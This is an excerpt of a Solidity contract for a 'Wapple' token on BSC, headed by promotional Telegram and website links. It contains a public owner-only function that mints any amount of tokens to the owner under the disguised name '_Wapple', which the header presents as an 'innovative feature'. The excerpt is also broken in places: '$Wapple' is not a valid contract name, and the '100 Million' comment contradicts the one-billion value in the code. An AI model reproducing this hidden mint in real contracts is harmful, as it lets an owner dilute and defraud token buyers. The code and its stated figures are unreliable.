//
// $Wapple proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/WappleBSC
// 📱 Website ::https://wapple.com/
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _Wapple(uint256 amount) public onlyOwner {
 _Wapple(msg.sender, amount);
    }
    ...
    function _Wapple(address account, uint256 amount) internal virtual {
...
contract $Wapple is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Wapple", "WAPPLE") {
     _Wapple(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}